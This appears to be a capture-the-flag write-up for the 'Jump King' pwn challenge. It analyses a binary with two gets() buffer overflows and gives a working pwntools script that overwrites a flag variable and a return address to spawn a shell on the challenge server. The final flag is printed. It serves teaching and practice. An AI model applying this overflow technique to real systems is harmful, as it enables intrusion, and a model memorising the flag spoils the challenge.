# ## Jump King

**Author:** randN
**Category:** pwn
**Difficulty:** easy

## Description
```
A student developed a jumping game based in a username and password. Can you get the final jump?
```

## Solve
For this challenge a file is provided, **jump_to_win**, and we can spawn an individual docker instance.

![Alt text](https://github.com/uac-ctf/MetaRed2021-5th-Writeups/blob/master/pwn/jump_king/images/file_output.png?raw=true)

We can also use [_checksec_](https://docs.pwntools.com/en/stable/commandline.html?highlight=checksec#pwn-checksec) to see what protections are enabled in the binary.

![Alt text](https://github.com/uac-ctf/MetaRed2021-5th-Writeups/blob/master/pwn/jump_king/images/checksec.png?raw=true)

The ASLR is enabled, which means the addresses are randomized, and can make our file harder.

The file is an ELF, not stripped each will make our life much easier in order to understand how the binary behaves. In order to get more details about it, lets use [Ghidra](https://ghidra-sre.org/), that will decompile the binary.

![Alt text](https://github.com/uac-ctf/MetaRed2021-5th-Writeups/blob/master/pwn/jump_king/images/main.png?raw=true)
![Alt text](https://github.com/uac-ctf/MetaRed2021-5th-Writeups/blob/master/pwn/jump_king/images/jump.png?raw=true)
![Alt text](https://github.com/uac-ctf/MetaRed2021-5th-Writeups/blob/master/pwn/jump_king/images/vuln.png?raw=true)

After running Ghidra we can see now that the binary starts executing the main, then if the **flag** variable is different than 0 it will call the jump function, and if the same variable has a specific value, **0x4155**, the jump function will call vuln that will execute the **/bin/sh** command. The jump function is also leaking the vuln function address, so we don't need to worry about the ASLR.

Both inputs are vulnerable to buffer overflow, because of the [gets](https://linux.die.net/man/3/gets) function, it will read input until it finds a **EOF**, since the variable to where it will write has a defined size, 32, and if we send more that 32 characters we will start writing over stuff in the stack.

First lets try to send an input that will change the flag variable and with that call the jump function. Sending 65 "A"s will change the flag value, but not to the correct one. We can send the hex value after the offset needed, 64, or we can send the characters **UA** that will result in the same value.

Now we can access the second input, we just need to send an offset big enough that will reach the position immediately behind the RBP, and since we have the vuln address we just need to write it after the offset. To discover the offsets needed I used [GEF](https://gef.readthedocs.io/en/master/). Using pwntools a possible solution would be:

```python
# https://docs.pwntools.com/en/stable/
from pwn import *

p = remote('ctf-metared-2021.ua.pt', 25677)

p.recvuntil(b' == Your username: \n')

first_payload = b'A' * 64 + b'UA'
p.sendline(first_payload)

p.recvline()
tmp = p.recvline()
vuln_address = tmp.decode().split(':')[1].strip().replace('\n', '')
second_payload = b'A' * 40 + p64(int(vuln_address, 0))

p.sendline(second_payload)
p.interactive()
p.close()

```


## Flag

CTFUA{Jump1ng_Ar0und_w1Th_aSlR}
